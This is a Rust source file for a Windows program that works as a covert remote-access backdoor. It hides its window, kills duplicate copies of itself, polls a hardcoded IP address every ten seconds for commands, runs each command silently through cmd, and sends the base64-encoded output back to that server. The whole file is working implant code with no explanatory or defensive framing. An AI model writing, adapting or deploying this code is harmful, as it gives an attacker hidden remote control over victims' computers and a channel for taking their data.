
#![windows_subsystem = "windows"]

use std::error::Error;
use std::os::windows::process::CommandExt;
use std::process::Command;
use std::{env, thread};
use std::path::Path;
use std::time::Duration;
use base64::prelude::*;
use sysinfo::{get_current_pid, System};

const CREATE_NO_WINDOW: u32 = 0x08000000;

fn main() {

    let s = System::new_all();

    let binding = env::current_exe().unwrap();
    let exe_path= Path::new(&binding);

    let exe_name = exe_path.file_name().unwrap();

    let current_pid = get_current_pid().unwrap();

    for process in s.processes_by_name(exe_name) {
        if process.pid() ==current_pid{
            continue;
        }
        process.kill();
    }

    loop {
        thread::spawn(|| {
            let command = match get_request_response("command") {
                Ok(command) => command,
                Err(_) => {
                    return;
                }
            };


            let output = Command::new("cmd")
                .args(&["/C", command.as_str()])
                .creation_flags(CREATE_NO_WINDOW)
                .output()
                .expect("failed to execute process");


            println!("cmd: {}", command);
            println!("stdout: {}", String::from_utf8_lossy(&output.stdout));

            get_request_response(&format!("stdout/{0}",
                                         BASE64_STANDARD.encode(String::from_utf8_lossy(&output.stdout).as_bytes()))
            ).unwrap();
        });
        thread::sleep(Duration::from_secs(10));
    }
}

fn get_request_response(string: &str) -> Result<String, Box<dyn Error>>{
    let response = reqwest::blocking::get(format!("http://24.4.89.35:9090/{string}"))?;
    let text = response.text()?;

    Ok(text)
}